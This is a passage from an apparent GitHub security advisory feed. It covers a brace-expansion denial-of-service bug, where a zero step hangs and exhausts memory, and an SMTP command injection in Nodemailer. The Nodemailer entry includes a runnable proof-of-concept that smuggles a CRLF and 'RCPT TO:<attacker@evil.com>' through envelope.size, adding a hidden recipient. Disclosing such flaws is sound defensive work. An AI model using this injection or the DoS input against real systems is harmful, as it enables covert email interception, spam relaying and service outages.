<p><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113</a></p>
<p>The increment is computed as <code>Math.abs(0) = 0</code>, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a <code>RangeError</code>. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.</p>
<p>This affects any application that passes untrusted strings to expand(), or by error sets a step value of <code>0</code>. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to versions</p>
<ul>
<li>5.0.5+</li>
</ul>
<p>A step increment of 0 is now sanitized to 1, which matches bash behavior.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Sanitize strings passed to <code>expand()</code> to ensure a step value of <code>0</code> is not used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/issues/98">https://github.com/juliangruber/brace-expansion/issues/98</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/95">https://github.com/juliangruber/brace-expansion/pull/95</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/96">https://github.com/juliangruber/brace-expansion/pull/96</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/97">https://github.com/juliangruber/brace-expansion/pull/97</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5">https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2">https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a">https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a</a></li>
<li><a href="https://github.com/advisories/GHSA-f886-m6hf-6m8v">https://github.com/advisories/GHSA-f886-m6hf-6m8v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f886-m6hf-6m8v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T18:29:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nodemailer] Nodemailer has SMTP command injection due to unsanitized `envelope.size` parameter]]></title>
        <id>https://github.com/advisories/GHSA-c7w3-x93f-qmm8</id>
        <link href="https://github.com/advisories/GHSA-c7w3-x93f-qmm8"/>
        <updated>2026-03-26T22:26:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When a custom <code>envelope</code> object is passed to <code>sendMail()</code> with a <code>size</code> property containing CRLF characters (<code>\r\n</code>), the value is concatenated directly into the SMTP <code>MAIL FROM</code> command without sanitization. This allows injection of arbitrary SMTP commands, including <code>RCPT TO</code> — silently adding attacker-controlled recipients to outgoing emails.</p>
<h3 id="details">Details</h3>
<p>In <code>lib/smtp-connection/index.js</code> (lines 1161-1162), the <code>envelope.size</code> value is concatenated into the SMTP <code>MAIL FROM</code> command without any CRLF sanitization:</p>
<pre><code class="language-javascript">if (this._envelope.size &amp;&amp; this._supportedExtensions.includes('SIZE')) {
    args.push('SIZE=' + this._envelope.size);
}
</code></pre>
<p>This contrasts with other envelope parameters in the same function that ARE properly sanitized:</p>
<ul>
<li><strong>Addresses</strong> (<code>from</code>, <code>to</code>): validated for <code>[\r\n&lt;&gt;]</code> at lines 1107-1127</li>
<li><strong>DSN parameters</strong> (<code>dsn.ret</code>, <code>dsn.envid</code>, <code>dsn.orcpt</code>): encoded via <code>encodeXText()</code> at lines 1167-1183</li>
</ul>
<p>The <code>size</code> property reaches this code path through <code>MimeNode.setEnvelope()</code> in <code>lib/mime-node/index.js</code> (lines 854-858), which copies all non-standard envelope properties verbatim:</p>
<pre><code class="language-javascript">const standardFields = ['to', 'cc', 'bcc', 'from'];
Object.keys(envelope).forEach(key =&gt; {
    if (!standardFields.includes(key)) {
        this._envelope[key] = envelope[key];
    }
});
</code></pre>
<p>Since <code>_sendCommand()</code> writes the command string followed by <code>\r\n</code> to the raw TCP socket, a CRLF in the <code>size</code> value terminates the <code>MAIL FROM</code> command and starts a new SMTP command.</p>
<p>Note: by default, Nodemailer constructs the envelope automatically from the message's <code>from</code>/<code>to</code> fields and does not include <code>size</code>. This vulnerability requires the application to explicitly pass a custom <code>envelope</code> object with a <code>size</code> property to <code>sendMail()</code>. 
While this limits the attack surface, applications that expose envelope configuration to users are affected.</p>
<h3 id="poc">PoC</h3>
<p>ave the following as <code>poc.js</code> and run with <code>node poc.js</code>:</p>
<pre><code class="language-javascript">const net = require('net');
const nodemailer = require('nodemailer');

// Minimal SMTP server that logs raw commands
const server = net.createServer(socket =&gt; {
    socket.write('220 localhost ESMTP\r\n');
    let buffer = '';
    socket.on('data', chunk =&gt; {
        buffer += chunk.toString();
        const lines = buffer.split('\r\n');
        buffer = lines.pop();
        for (const line of lines) {
            if (!line) continue;
            console.log('C:', line);
            if (line.startsWith('EHLO')) {
                socket.write('250-localhost\r\n250-SIZE 10485760\r\n250 OK\r\n');
            } else if (line.startsWith('MAIL FROM')) {
                socket.write('250 OK\r\n');
            } else if (line.startsWith('RCPT TO')) {
                socket.write('250 OK\r\n');
            } else if (line === 'DATA') {
                socket.write('354 Start\r\n');
            } else if (line === '.') {
                socket.write('250 OK\r\n');
            } else if (line.startsWith('QUIT')) {
                socket.write('221 Bye\r\n');
                socket.end();
            }
        }
    });
});

server.listen(0, '127.0.0.1', () =&gt; {
    const port = server.address().port;
    console.log('SMTP server on port', port);
    console.log('Sending email with injected RCPT TO...\n');

    const transporter = nodemailer.createTransport({
        host: '127.0.0.1',
        port,
        secure: false,
        tls: { rejectUnauthorized: false },
    });

    transporter.sendMail({
        from: 'sender@example.com',
        to: 'recipient@example.com',
        subject: 'Normal email',
        text: 'This is a normal email.',
        envelope: {
            from: 'sender@example.com',
            to: ['recipient@example.com'],
            size: '100\r\nRCPT TO:&lt;attacker@evil.com&gt;',
        },
    }, (err) =&gt; {
        if (err) console.error('Error:', err.message);
        console.log('\nExpected output above:');
        console.log('  C: MAIL FROM:&lt;sender@example.com&gt; SIZE=100');
        console.log('  C: RCPT TO:&lt;attacker@evil.com&gt;        &lt;-- INJECTED');
        console.log('  C: RCPT TO:&lt;recipient@example.com&gt;');
        server.close();
        transporter.close();
    });
});
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code>SMTP server on port 12345
Sending email with injected RCPT TO...

C: EHLO [127.0.0.1]
C: MAIL FROM:&lt;sender@example.com&gt; SIZE=100
C: RCPT TO:&lt;attacker@evil.com&gt;
C: RCPT TO:&lt;recipient@example.com&gt;
C: DATA
...
C: .
C: QUIT
</code></pre>
<p>The <code>RCPT TO:&lt;attacker@evil.com&gt;</code> line is injected by the CRLF in the <code>size</code> field, silently adding an extra recipient to the email.</p>
<h3 id="impact">Impact</h3>
<p>This is an SMTP command injection vulnerability. An attacker who can influence the <code>envelope.size</code> property in a <code>sendMail()</code> call can:</p>
<ul>
<li><strong>Silently add hidden recipients</strong> to outgoing emails via injected <code>RCPT TO</code> commands, receiving copies of all emails sent through the affected transport</li>
<li><strong>Inject arbitrary SMTP commands</strong> (e.g., <code>RSET</code>, additional <code>MAIL FROM</code> to send entirely separate emails through the server)</li>
<li><strong>Leverage the sending organization's SMTP server reputation</strong> for spam or phishing delivery</li>
</ul>
<p>The severity is mitigated by the fact that the <code>envelope</code> object must be explicitly provided by the application. Nodemailer's default envelope construction from message headers does not include <code>size</code>. Applications that pass through user-controlled data to the envelope options (e.g., via API parameters, admin panels, or template configurations) are vulnerable.</p>
<p>Affected versions: at least v8.0.3 (current); likely all versions where <code>envelope.size</code> is supported.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-c7w3-x93f-qmm8">https://github.com/nodemailer/nodemailer/security/advisories/GHSA-c7w3-x93f-qmm8</a></li>
<li><a href="https://github.com/nodemailer/nodemailer/commit/2d7b9710e63555a1eb13d721296c51186d4b5651">https://github.com/nodemailer/nodemailer/commit/2d7b9710e63555a1eb13d721296c51186d4b5651</a></li>
<li><a href="https://github.com/advisories/GHSA-c7w3-x93f-qmm8">https://github.com/advisories/GHSA-c7w3-x93f-qmm8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c7w3-x93f-qmm8</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-26T22:26:46.000Z</published>
    </entry>
</feed>